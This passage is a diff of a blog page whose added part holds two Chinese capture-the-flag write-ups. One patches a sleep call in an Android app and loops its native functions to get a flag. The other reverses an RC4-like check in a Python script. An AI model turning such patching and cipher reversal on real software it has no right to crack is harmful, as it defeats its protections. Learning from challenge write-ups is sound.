-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/BCTF2016-pingpongmachine/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/njctf/">南京CTF2017 easycrack</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            Category: MobilePoints: 100
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/njctf/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/28/unlink/">pwnable.kr之unlink</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/28/unlink/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 28, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/27/hurry-up/">2016武汉某宣传周题目----Hurry Up</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/27/hurry-up/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 27, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/27/GeekpwnSecretCode/">Geekpwn SecretCode</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/27/GeekpwnSecretCode/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 27, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/27/abc/">2016武汉某宣传周题目----Hurry Up</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/27/abc/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Sep 27, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/08/12/sqzip/"></a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-title: 神奇的zip 顺藤摸瓜date: 2017-09-27 0:0:0tags:
-
-an...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/08/12/sqzip/" target="_self">Weiterlesen</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="Joachim Hyrathon's avatar">
-            </div>
-            <div>
-                <strong>Joachim Hyrathon</strong>
-                <span>Aug 12, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-    <!-- Index nav -->
-        <nav class="material-nav mdl-cell mdl-cell--12-col">
-            <a class="extend prev" rel="prev" href="/"><button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"><i class="material-icons" role="presentation">arrow_back</i></button></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-        </nav>
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
-    $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
-</script>
-
-    
-</div>
-
-
-                    
-                        <!-- Overlay For Active Sidebar -->
-<div class="sidebar-overlay"></div>
-
-<!-- Material sidebar -->
-<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
-    <div id="sidebar-main">
-        <!-- Sidebar Header -->
-        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
-    <!-- Top bar -->
-    <div class="top-bar"></div>
-
-    <!-- Sidebar toggle button -->
-    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
-        <i class="material-icons">clear_all</i>
-        <span class="mdl-button__ripple-container">
-            <span class="mdl-ripple">
-            </span>
-        </span>
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
     </button>
-
-    <!-- Sidebar Avatar -->
-    <div class="sidebar-image">
-        <img src="/img/avatar.png" alt="Joachim Hyrathon's avatar">
-    </div>
-
-    <!-- Sidebar Email -->
-    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
-        youremail@email.com
-        <b class="caret"></b>
-    </a>
+  </div>
 </div>
 
+<nav class="site-nav">
+  
 
-        <!-- Sidebar Navigation  -->
-        <ul class="nav sidebar-nav">
-    <!-- User dropdown  -->
-    <li class="dropdown">
-        <ul id="settings-dropdown" class="dropdown-menu">
-            
-                <li>
-                    <a href="#" target="_blank" title="Email Me">
-                        
-                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
-                        
-                        Email Me
-                    </a>
-                </li>
-            
-        </ul>
-    </li>
-
-    <!-- Homepage -->
-    
-        <li id="sidebar-first-li">
-            <a href="/">
-                
-                    <i class="material-icons sidebar-material-icons">home</i>
-                
-                Home
-            </a>
-        </li>
+  
+    <ul id="menu" class="menu">
+      
         
-    
-
-    <!-- Archives  -->
-    
-        <li class="dropdown">
-            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
-                
-                    <i class="material-icons sidebar-material-icons">inbox</i>
-                
-                    Archive
-                <b class="caret"></b>
-            </a>
-            <ul class="dropdown-menu">
-            <li>
-                <a class="sidebar_archives-link" href="/archives/2017/09/">September 2017<span class="sidebar_archives-count">16</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">August 2017<span class="sidebar_archives-count">1</span></a>
-            </ul>
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
         </li>
+      
         
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/BCTF2016-pingpongmachine/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/BCTF2016-pingpongmachine/" itemprop="url">BCTF2016 pingpongmachine</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
     
 
-    <!-- Categories  -->
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="pingpong-555"><a href="#pingpong-555" class="headerlink" title="pingpong - 555"></a>pingpong - 555</h1><p>拿到题之后解包, 整体上Java逻辑没有明显混淆, C层用了O-LLVM混淆, 但是代码量不大. 整体上没有加壳或者对完整性校验. 通过观察Java层逻辑, 要求我们依次点击ping pong两个按键, 共计100万次.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="keyword">this</span>.p = <span class="number">0</span>;</div><div class="line">    <span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">    <span class="keyword">this</span>.ttt = <span class="number">1000000</span>;</div><div class="line">    <span class="keyword">this</span>.tt = <span class="keyword">this</span>.ttt;</div><div class="line">    <span class="keyword">this</span>.jping = <span class="keyword">new</span> com.geekerchina.pingpongmachine.MainActivity$<span class="number">1</span>(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">this</span>.jpong = <span class="keyword">new</span> com.geekerchina.pingpongmachine.MainActivity$<span class="number">2</span>(<span class="keyword">this</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">1</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        --MainActivity.<span class="keyword">this</span>.tt;</div><div class="line">        MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.ping(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</div><div class="line">        ++MainActivity.<span class="keyword">this</span>.num;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        View v0 = MainActivity.<span class="keyword">this</span>.findViewById(<span class="number">2131427414</span>);</div><div class="line">        ((TextView)v0).setText(<span class="string">"PING"</span>);</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</div><div class="line">            ((TextView)v0).setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">0</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">            MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        --MainActivity.<span class="keyword">this</span>.tt;</div><div class="line">        MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.pong(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</div><div class="line">        ++MainActivity.<span class="keyword">this</span>.num;</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</div><div class="line">            MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        View v0 = MainActivity.<span class="keyword">this</span>.findViewById(<span class="number">2131427414</span>);</div><div class="line">        ((TextView)v0).setText(<span class="string">"PONG"</span>);</div><div class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</div><div class="line">            ((TextView)v0).setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>在C层会发现sleep(1) 暂停一秒, 如果直接调用点击时间肯定不够, 因此将sleep一秒patch掉, 可以改为 mov r1, r1.<br>之后自己写一个包名和原程序相同的包, 依次调用ping 和pong 共计100万次, 随后输出结果.</p>
+<p>一个示例的调用程序为:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">setContentView(R.layout.activity_main);</div><div class="line"><span class="keyword">int</span> p = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</div><div class="line"></div><div class="line">p = pong(p, num);</div><div class="line">num ++;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> tt = <span class="number">1000000</span> - <span class="number">1</span>; tt != <span class="number">0</span>; --tt)&#123;</div><div class="line">    <span class="keyword">if</span>(tt % <span class="number">2</span> == <span class="number">0</span>)&#123;</div><div class="line">        p = ping(p,num);</div><div class="line">        num ++;</div><div class="line">        <span class="keyword">if</span>(num &gt;=<span class="number">7</span>) num = <span class="number">0</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        p = pong(p, num);</div><div class="line">        num ++;</div><div class="line">        <span class="keyword">if</span>(num &gt;= <span class="number">7</span>) num = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//Log.e("yourdad", Integer.toString(p));</span></div><div class="line">((TextView)findViewById(R.id.a)).setText(String.valueOf(p));</div></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
     
 
-    <!-- Pages  -->
     
 
-    <!-- Article Number  -->
     
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/njctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/njctf/" itemprop="url">南京CTF2017 easycrack</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>Category:</strong> Mobile<br><strong>Points:</strong> 100<br><strong>Solves:</strong>43<br><strong>Description:</strong> None</p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h2><p>ARM二进制分析题, Java里边基本没有内容, 只有一个native需要的固定值msg是从Java中计算然后传进去的, 写个脚本跑一下就能得到这个值.</p>
+<p>程序运行流程是经典的字符串加密, 用户输入经过与msg的异或处理后被与一个I_am_the_key字符串经过复杂但是固定的运算流程得到的值进行加密, 我们称这个值为buffer, 加密过程 buffer 与处理过的用户输入进行加密, 但是加密算法实质是异或可逆, 因此在得知结果的时候即可算出用户输入. 叙述不是特别明确, 简单画图解释:</p>
+<p>user_input(?)  ——&gt; xor  —-&gt; 处理过的输入————————————&gt;crypt————–&gt;结果</p>
+<p>msg——————–&gt;              I_am_the_key——&gt;process——&gt;buffer—&gt;</p>
+<p>通过逆向发现结果作为明文字符串存储在二进制文件中, 因为上述每一步都可逆, 因此可以编写脚本反过来执行, 从结果获得最初的用户输入. 分析过程比较简单, 不具体说明, 详见idb</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">debug = <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="comment">#seems like a char shift</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(s=<span class="string">"I_am_the_key"</span>)</span>:</span></div><div class="line">    buffer1 = []</div><div class="line">    buffer2 = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">        buffer1 += chr(i)</div><div class="line">        buffer2 += s[i % len(s)]</div><div class="line">    <span class="keyword">if</span> debug :</div><div class="line">        <span class="keyword">print</span> buffer1</div><div class="line">        <span class="keyword">print</span> buffer2</div><div class="line"></div><div class="line">    v7 = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">        v9 = buffer1[j]</div><div class="line">        v7 = (v7 + ord(v9) + ord(buffer2[j])) % <span class="number">256</span></div><div class="line">        buffer1[j] = buffer1[v7]</div><div class="line">        buffer1[v7] = v9</div><div class="line">    <span class="keyword">return</span> map(ord, buffer1)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcompare</span><span class="params">()</span>:</span></div><div class="line">    cmpstr = <span class="string">"C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4"</span></div><div class="line">    compare = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cmpstr)/<span class="number">2</span>):</div><div class="line">        compare += cmpstr[<span class="number">2</span> * i:<span class="number">2</span> * i+<span class="number">2</span>].decode(<span class="string">'hex'</span>)</div><div class="line">    <span class="keyword">return</span> map(ord, compare)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(buffer, compare)</span>:</span></div><div class="line">    v3=<span class="number">0</span></div><div class="line">    v4=<span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">        v3 = (v3 + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">        v5 = buffer[v3];</div><div class="line">        v4 = (v5 + v4) % <span class="number">256</span>;</div><div class="line">        buffer[v3] = buffer[v4];</div><div class="line">        buffer[v4] = v5;</div><div class="line">        compare[i] ^= buffer[(buffer[v3] + v5) % <span class="number">256</span>];</div><div class="line">    <span class="keyword">return</span> compare</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getuserinput</span><span class="params">(beforecrypt)</span>:</span></div><div class="line">    msg = map(ord, <span class="string">"V7D=^,M.E"</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">        beforecrypt[i] ^= msg[i % <span class="number">9</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(map(chr, beforecrypt))</div><div class="line"></div><div class="line"></div><div class="line">buffer = init()</div><div class="line">compare = getcompare()</div><div class="line">beforecrypt = decrypt(buffer, compare)</div><div class="line"><span class="keyword">print</span> getuserinput(beforecrypt)</div></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
